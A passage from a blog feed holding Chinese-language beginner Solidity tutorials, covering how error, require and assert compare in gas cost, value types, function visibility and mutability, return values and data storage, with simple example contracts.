alt="image-20250127124300009"></p><h3 id="Require">Require</h3><p><code>require</code>命令是<code>solidity 0.8版本</code>之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。它很好用，唯一的缺点就是<code>gas</code>随着描述异常的字符串长度增加，比<code>error</code>命令要高。使用方法：<code>require(检查条件，&quot;异常的描述&quot;)</code>，<strong>当检查条件不成立的时候，就会抛出异常。</strong></p><p>我们用<code>require</code>命令重写一下上面的<code>transferOwner1</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner2(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    require(_owners[tokenId] == msg.sender, &quot;Transfer Not Owner&quot;);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>require</code>消耗<code>gas</code>的量为<code>24211</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127125601300.png" alt="image-20250127125601300"></p><h3 id="Assert">Assert</h3><p><code>assert</code>命令一般用于程序员写程序<code>debug</code>，因为它不能解释抛出异常的原因（比<code>require</code>少个字符串）。它的用法很简单，<code>assert(检查条件）</code>，<strong>当检查条件不成立的时候，就会抛出异常。</strong></p><p>我们用<code>assert</code>命令重写一下上面的<code>transferOwner1</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function transferOwner3(uint256 tokenId, address newOwner) public &#123;</span><br><span class="line">    assert(_owners[tokenId] == msg.sender);</span><br><span class="line">    _owners[tokenId] = newOwner;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>assert</code>消耗<code>gas</code>的量为<code>24109</code></p><p><img src="/2025/01/26/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%BA%8C/image-20250127130047597.png" alt="image-20250127130047597"></p><h3 id="三种方法的gas比较">三种方法的gas比较</h3><p>我们比较一下三种抛出异常的<code>gas</code>消耗，查询<code>gas</code>的消耗 （使用0.8.26版本编译）</p><ol><li><code>error</code>方法<code>gas</code>消耗：24095 (加入参数后<code>gas</code>消耗：24113)</li><li><code>require</code>方法<code>gas</code>消耗：24211</li><li><code>assert</code>方法<code>gas</code>消耗：24109</li></ol><p>我们可以看到，<code>error</code>方法<code>gas</code>最少，其次是<code>assert</code>，<code>require</code>方法消耗<code>gas</code>最多！因此，<code>error</code>既可以告知用户抛出异常的原因，又能省<code>gas</code>，大家要多用！（注意，由于部署测试时间的不同，每个函数的<code>gas</code>消耗会有所不同，但是比较结果会是一致的。）</p><p><strong>备注:</strong> Solidity 0.8.0之前的版本，<code>assert</code>抛出的是一个 <code>panic exception</code>，会把剩余的 <code>gas</code> 全部消耗，不会返还。更多细节见<a href="https://docs.soliditylang.org/en/v0.8.17/control-structures.html">官方文档</a>。</p><h2 id="参考">参考</h2><p><a href="https://www.wtf.academy/docs/solidity-101/HelloWeb3">https://www.wtf.academy/docs/solidity-101/HelloWeb3</a></p><p><a href="https://github.com/AmazingAng/WTF-Solidity">https://github.com/AmazingAng/WTF-Solidity</a></p><p><a href="https://learnblockchain.cn/docs/ethers.js/api.html">https://learnblockchain.cn/docs/ethers.js/api.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 以太坊 </tag>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solidity入门学习(一)</title>
      <link href="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/"/>
      <url>/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Hello-Web3">Hello Web3</h2><h3 id="Solidity简介">Solidity简介</h3><p><code>Solidity</code>是一种用于编写以太坊虚拟机(<code>EVM</code>)智能合约的编程语言。</p><h3 id="Hello-Web3-2">Hello Web3</h3><p>简单的程序<code>HelloWeb3.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract HelloWeb3&#123;</span><br><span class="line">    string public _string = &quot;Hello Web3!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用到<a href="https://remix.ethereum.org/">https://remix.ethereum.org/</a></p><p>进行编译和部署，点击<code>_string</code>输出。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250122224953662.png" alt="image-20250122224953662"></p><p>代码中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.21;</span><br></pre></td></tr></table></figure><p>表示源文件将不允许小于 0.8.21 版本或大于等于 0.9.0 的编译器编译（第二个条件由 <code>^</code> 提供）。</p><p>其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string public _string = &quot;Hello Web3!&quot;;</span><br></pre></td></tr></table></figure><p><code>public</code> 修饰符表示 <code>_string</code> 变量是公开的，任何人都可以读取该变量的值。</p><p>Solidity 会自动为 <code>public</code> 修饰的状态变量生成一个 getter 函数，允许外部代码（如其他合约或外部用户）通过合约的 ABI（应用二进制接口）访问这个变量的值。</p><h2 id="值类型">值类型</h2><h3 id="Solidity中的变量类型">Solidity中的变量类型</h3><ol><li><strong>值类型(Value Type)</strong>：包括布尔型、整数型等等，这类变量赋值时候直接传递数值。</li><li><strong>引用类型(Reference Type)</strong>：包括数组和结构体，这类变量占空间大，赋值时候直接传递地址（类似指针）。</li><li><strong>映射类型(Mapping Type)</strong>：Solidity中存储键值对的数据结构，可以理解为哈希表。</li></ol><p>编写一个简单的程序<code>ValueTypes.sol</code>，介绍一下各种变量类型，程序如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract ValueTypes&#123;</span><br><span class="line">    // 布尔值</span><br><span class="line">    bool public _bool = true;</span><br><span class="line">    // 布尔运算</span><br><span class="line">    bool public _bool1 = !_bool; //取非</span><br><span class="line">    bool public _bool2 = _bool &amp;&amp; _bool1; //与</span><br><span class="line">    bool public _bool3 = _bool || _bool2; //或</span><br><span class="line">    bool public _bool4 = _bool == _bool; //相等</span><br><span class="line">    bool public _bool5 = _bool != _bool1; //不想等</span><br><span class="line">    // 整数</span><br><span class="line">    int public _int = -1;</span><br><span class="line">    uint public _uint = 1;</span><br><span class="line">    uint256 public _number = 20250122;</span><br><span class="line">    // 整数运算</span><br><span class="line">    uint256 public _number1 = _number + 1; // +，-，*，/</span><br><span class="line">    uint256 public _number2 = 2**2; // 指数</span><br><span class="line">    uint256 public _number3 = 7 % 2; // 取余数</span><br><span class="line">    bool public _numberbool = _number2 &gt; _number3; // 比大小</span><br><span class="line">    // 地址</span><br><span class="line">    address public _address = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;</span><br><span class="line">    address payable public _address1 = payable(_address); // payable address，可以转账、查余额</span><br><span class="line">    // 地址类型的成员</span><br><span class="line">    uint256 public balance = _address1.balance; // balance of address</span><br><span class="line">    // 固定长度的字节数组</span><br><span class="line">    bytes32 public _byte32 = &quot;MiniSolidity&quot;; </span><br><span class="line">    bytes1 public _byte = _byte32[0];</span><br><span class="line"></span><br><span class="line">    // 用enum将uint 0， 1， 2表示为Buy, Hold, Sell</span><br><span class="line">    enum ActionSet &#123; Buy, Hold, Sell &#125;</span><br><span class="line">    // 创建enum变量 action</span><br><span class="line">    //ActionSet action = ActionSet.Buy;</span><br><span class="line">    ActionSet action = ActionSet.Buy;</span><br><span class="line">    // enum可以和uint显式的转换</span><br><span class="line">    function enumToUint() external view returns(uint)&#123;</span><br><span class="line">        return uint(action);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="地址类型">地址类型</h3><p>地址类型(address)有两类：</p><ul><li>普通地址（address）: 存储一个 20 字节的值（以太坊地址的大小）。</li><li>payable address: 比普通地址多了 <code>transfer</code> 和 <code>send</code> 两个成员方法，用于接收转账。</li></ul><h3 id="定长字节数组">定长字节数组</h3><p>字节数组分为定长和不定长两种：</p><ul><li>定长字节数组: 属于值类型，数组长度在声明之后不能改变。根据字节数组的长度分为 <code>bytes1</code>, <code>bytes8</code>, <code>bytes32</code> 等类型。定长字节数组最多存储 32 bytes 数据，即<code>bytes32</code>。</li><li>不定长字节数组: 属于引用类型，数组长度在声明之后可以改变，包括 <code>bytes</code> 等。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 固定长度的字节数组</span><br><span class="line">bytes32 public _byte32 = &quot;MiniSolidity&quot;; </span><br><span class="line">bytes1 public _byte = _byte32[0]; </span><br></pre></td></tr></table></figure><p>在上述代码中，<code>MiniSolidity</code> 变量以字节的方式存储进变量 <code>_byte32</code>。如果把它转换成 <code>16 进制</code>，就是：<code>0x4d696e69536f6c69646974790000000000000000000000000000000000000000</code></p><p><code>_byte</code> 变量的值为 <code>_byte32</code> 的第一个字节，即 <code>0x4d</code>。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250122234241902.png" alt="image-20250122234241902"></p><h3 id="枚举enum">枚举enum</h3><p>枚举（<code>enum</code>）是 Solidity 中用户定义的数据类型。它主要用于为 <code>uint</code> 分配名称，使程序易于阅读和维护。它与 <code>C 语言</code> 中的 <code>enum</code> 类似，使用名称来代替从 <code>0</code> 开始的 <code>uint</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 用enum将uint 0， 1， 2表示为Buy, Hold, Sell</span><br><span class="line">enum ActionSet &#123; Buy, Hold, Sell &#125;</span><br><span class="line">// 创建enum变量 action</span><br><span class="line">ActionSet action = ActionSet.Buy;</span><br></pre></td></tr></table></figure><p>枚举可以显式地和 <code>uint</code> 相互转换，并会检查转换的正整数是否在枚举的长度内，否则会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// enum可以和uint显式的转换</span><br><span class="line">function enumToUint() external view returns(uint)&#123;</span><br><span class="line">    return uint(action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>enum</code> 是一个比较冷门的变量，几乎没什么人用。</p><p><code>enum</code>和<code>uint</code>相互转换，如下：</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250122234959766.png" alt="image-20250122234959766"></p><h2 id="函数和函数输出">函数和函数输出</h2><h3 id="函数">函数</h3><h4 id="函数的代码形式">函数的代码形式</h4><p>Solidity 中函数的形式(方括号中的是可写可不 写的关键字)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function &lt;function name&gt;(&lt;parameter types&gt;) &#123;internal|external|public|private&#125; [pure|view|payable] [returns (&lt;return types&gt;)]</span><br></pre></td></tr></table></figure><ol><li><p><code>function</code>：声明函数时的固定用法。要编写函数，就需要以 <code>function</code> 关键字开头。</p></li><li><p><code>&lt;function name&gt;</code>：函数名。</p></li><li><p><code>(&lt;parameter types&gt;)</code>：圆括号内写入函数的参数，即输入到函数的变量类型和名称。</p></li><li><p><code>&#123;internal|external|public|private&#125;</code>：函数可见性说明符，共有4种。</p><ul><li><p><code>public</code>：内部和外部均可见。</p></li><li><p><code>private</code>：只能从本合约内部访问，继承的合约也不能使用。</p></li><li><p><code>external</code>：只能从合约外部访问（但内部可以通过 <code>this.f()</code> 来调用，<code>f</code>是函数名）。</p></li><li><p><code>internal</code>: 只能从合约内部访问，继承的合约可以用。</p></li></ul><p><strong>注意1⚠️</strong>：合约中定义的函数需要明确指定可见性，它们没有默认值。</p><p><strong>注意2</strong>⚠️：<code>public|private|internal</code> 也可用于修饰状态变量。<code>public</code>变量会自动生成同名的<code>getter</code>函数，用于查询数值。未标明可见性类型的状态变量，默认为<code>internal</code>。</p></li><li><p><code>[pure|view|payable]</code>：决定函数权限/功能的关键字。<code>payable</code>（可支付的）很好理解，带着它的函数，运行的时候可以给合约转入 ETH。</p></li><li><p><code>[returns (&lt;return types&gt;)]</code>：函数返回的变量类型和名称。</p></li></ol><h4 id="到底什么是Pure和View？">到底什么是<code>Pure</code>和<code>View</code>？</h4><p><code>solidity</code> 引入这两个关键字主要是因为 以太坊交易需要支付gas fee。合约的状态变量存储在链上，gas fee 很贵，如果计算不改变链上状态，就可以不用付 <code>gas</code>。包含 <code>pure</code> 和 <code>view</code> 关键字的函数是不改写链上状态的，因此用户直接调用它们是不需要付 gas 的（注意⚠️，合约中非 <code>pure</code>/<code>view</code> 函数调用 <code>pure</code>/<code>view</code> 函数时需要付gas）。</p><p>在以太坊中，以下语句被视为修改链上状态：</p><ol><li>写入状态变量。</li><li>释放事件。</li><li>创建其他合约。</li><li>使用 <code>selfdestruct</code>.</li><li>通过调用发送以太币。</li><li>调用任何未标记 <code>view</code> 或 <code>pure</code> 的函数。</li><li>使用低级调用（low-level calls）。</li><li>使用包含某些操作码的内联汇编。</li></ol><ul><li><code>pure</code>函数既不能读取也不能写入链上的状态变量。</li><li><code>view</code>函数能读取但不能写入状态变量。</li><li>非<code>pure</code>或<code>view</code>的函数既可以读取也可以写入状态变量。</li></ul><h4 id="代码测试">代码测试</h4><p>测试代码<code>FunctionTypes.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line">contract FunctionTypes&#123;</span><br><span class="line">    uint256 public number = 5;</span><br><span class="line">    // 默认function</span><br><span class="line">    function add() external&#123;</span><br><span class="line">        number = number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // 验证pure和view</span><br><span class="line">    // function addtest() external view&#123;</span><br><span class="line">    //     number = number + 1;</span><br><span class="line">    // &#125;</span><br><span class="line">    </span><br><span class="line">    // pure</span><br><span class="line">    function addPure(uint256 _number) external pure returns(uint256 new_number)&#123;</span><br><span class="line">        new_number = _number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // view</span><br><span class="line">    function addView() external view returns(uint256 new_number) &#123;</span><br><span class="line">        new_number = number + 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // internal: 内部函数</span><br><span class="line">    function minus() internal &#123;</span><br><span class="line">        number = number - 1;</span><br><span class="line">    &#125;</span><br><span class="line">    // 合约内的函数可以调用内部函数</span><br><span class="line">    function minusCall() external &#123;</span><br><span class="line">        minus();</span><br><span class="line">    &#125;</span><br><span class="line">    // payable: 递钱，能给合约支付eth的函数</span><br><span class="line">    function minusPayable() external payable returns(uint256 balance) &#123;</span><br><span class="line">        minus();    </span><br><span class="line">        balance = address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="pure和view">pure和view</h5><p>在代码中定义了一个<code>add()</code>函数，每次调用会使得<code>number</code>加1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 默认function</span><br><span class="line">function add() external&#123;</span><br><span class="line">    number = number + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 <code>add()</code> 函数被标记为 <code>pure</code>，比如 <code>function add() external pure</code>，就会报错。因为 <code>pure</code> 是不能读取合约里的状态变量的，更不能改写。</p><p>使用到了<code>pure</code>出现的报错，如下：</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123030906176.png" alt="image-20250123030906176"></p><p>如果使用<code>view</code>，则代码会报错，证实了<code>view</code>是只能读取而不能写入状态变量。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123031819323.png" alt="image-20250123031819323"></p><p>那 <code>pure</code> 函数能做些什么？举个例子，你可以给函数传递一个参数 <code>_number</code>，然后让他返回 <code>_number + 1</code>，这个操作不会读取或写入状态变量。</p><p>如代码中的<code>addPure</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// pure</span><br><span class="line">function addPure(uint256 _number) external pure returns(uint256 new_number)&#123;</span><br><span class="line">    new_number = _number + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123031506521.png" alt="image-20250123031506521"></p><p><code>view</code>读取状态变量，然后对读取的结果进行加1。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// view</span><br><span class="line">function addView() external view returns(uint256 new_number) &#123;</span><br><span class="line">    new_number = number + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123032230889.png" alt="image-20250123032230889"></p><h5 id="internal和external的对比">internal和external的对比</h5><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// internal: 内部函数</span><br><span class="line">function minus() internal &#123;</span><br><span class="line">    number = number - 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 合约内的函数可以调用内部函数</span><br><span class="line">function minusCall() external &#123;</span><br><span class="line">    minus();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义了一个 <code>internal</code> 的 <code>minus()</code> 函数，每次调用使得 <code>number</code> 变量减少 1。由于 <code>internal</code> 函数只能由合约内部调用，我们必须再定义一个 <code>external</code> 的 <code>minusCall()</code> 函数，外部通过它间接调用内部的 <code>minus()</code> 函数。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123033818196.png" alt="image-20250123033818196"></p><h5 id="payable的使用">payable的使用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// payable: 递钱，能给合约支付eth的函数</span><br><span class="line">function minusPayable() external payable returns(uint256 balance) &#123;</span><br><span class="line">    minus();    </span><br><span class="line">    balance = address(this).balance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个 <code>external payable</code> 的 <code>minusPayable()</code> 函数，间接的调用 <code>minus()</code>，并且返回合约里的 ETH 余额（<code>this</code> 关键字可以让我们引用合约地址）。我们可以在调用 <code>minusPayable()</code> 时往合约里转入1个 ETH。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123034641393.png" alt="image-20250123034641393"></p><h3 id="函数输出">函数输出</h3><p>测试代码<code>Return.sol</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract Return&#123;</span><br><span class="line">    // 返回多个变量</span><br><span class="line">    function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;</span><br><span class="line">        return(1, true, [uint256(1),2,5]);</span><br><span class="line">    &#125;</span><br><span class="line">    // 命名式返回</span><br><span class="line">    function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">        _number = 2;</span><br><span class="line">        _bool = false;</span><br><span class="line">        _array = [uint256(3),2,1];</span><br><span class="line">    &#125;</span><br><span class="line">    // 命名式返回，依然支持return</span><br><span class="line">    function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">        return(1, true, [uint256(1),2,5]);</span><br><span class="line">    &#125;</span><br><span class="line">    //读取返回值，解构式赋值</span><br><span class="line">    function readReturn() public pure&#123;</span><br><span class="line">        //读取全部返回值</span><br><span class="line">        uint256 _number;</span><br><span class="line">        bool _bool;</span><br><span class="line">        bool _bool2;</span><br><span class="line">        uint256[3] memory _array;</span><br><span class="line">        (_number, _bool, _array) = returnNamed();</span><br><span class="line"></span><br><span class="line">        //读取部分返回值</span><br><span class="line">        (,_bool2,) = returnNamed();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="返回值：return和returns">返回值：return和returns</h4><ul><li><code>returns</code>: 跟在函数名后面，用于声明返回的变量类型及变量名。</li><li><code>return</code>: 用于函数主体中，返回指定的变量。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 返回多个变量</span><br><span class="line">function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;</span><br><span class="line">    return(1, true, [uint256(1),2,5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中，我们利用 <code>returns</code> 关键字声明了有多个返回值的 <code>returnMultiple()</code> 函数，然后我们在函数主体中使用 <code>return(1, true, [uint256(1),2,5])</code> 确定了返回值。</p><p>这里<code>uint256[3]</code>声明了一个长度为<code>3</code>且类型为<code>uint256</code>的数组作为返回值。<strong>因为<code>[1,2,3]</code>会默认为<code>uint8(3)</code>，因此<code>[uint256(1),2,5]</code>中首个元素必须强转<code>uint256</code>来声明该数组内的元素皆为此类型</strong>。</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123234741062.png" alt="image-20250123234741062"></p><h4 id="命名式返回">命名式返回</h4><p>可以在 <code>returns</code> 中标明返回变量的名称。Solidity 会初始化这些变量，并且自动返回这些函数的值，无需使用 <code>return</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 命名式返回</span><br><span class="line">function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">    _number = 2;</span><br><span class="line">    _bool = false;</span><br><span class="line">    _array = [uint256(3),2,1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中，我们用 <code>returns(uint256 _number, bool _bool, uint256[3] memory _array)</code> 声明了返回变量类型以及变量名。这样，在主体中只需为变量 <code>_number</code>、<code>_bool</code>和<code>_array</code> 赋值，即可<strong>自动返回</strong>。</p><p>也可以在命名式返回中用 <code>return</code> 来返回变量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 命名式返回，依然支持return</span><br><span class="line">function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">    return(1, true, [uint256(1),2,5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="解构式复制">解构式复制</h4><p>Solidity 支持使用解构式赋值规则来读取函数的全部或部分返回值。</p><ul><li>读取所有返回值：声明变量，然后将要赋值的变量用<code>,</code>隔开，按顺序排列。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint256 _number;</span><br><span class="line">bool _bool;</span><br><span class="line">uint256[3] memory _array;</span><br><span class="line">(_number, _bool, _array) = returnNamed();</span><br></pre></td></tr></table></figure><ul><li>读取部分返回值：声明要读取的返回值对应的变量，不读取的留空。在下面的代码中，我们只读取<code>_bool</code>，而不读取返回的<code>_number</code>和<code>_array</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(, _bool2, ) = returnNamed();</span><br></pre></td></tr></table></figure><h2 id="变量数据存储和作用域">变量数据存储和作用域</h2><p>测试代码<code>DataStorage.sol</code>，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract DataStorage &#123;</span><br><span class="line">    // The data location of x is storage.</span><br><span class="line">    // This is the only place where the</span><br><span class="line">    // data location can be omitted.</span><br><span class="line">    uint[] public x = [1,2,3];</span><br><span class="line"></span><br><span class="line">    function fStorage() public&#123;</span><br><span class="line">        //声明一个storage的变量xStorage，指向x。修改xStorage也会影响x</span><br><span class="line">        uint[] storage xStorage = x;</span><br><span class="line">        xStorage[0] = 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fMemory() public view&#123;</span><br><span class="line">        //声明一个Memory的变量xMemory，复制x。修改xMemory不会影响x</span><br><span class="line">        uint[] memory xMemory = x;</span><br><span class="line">        xMemory[0] = 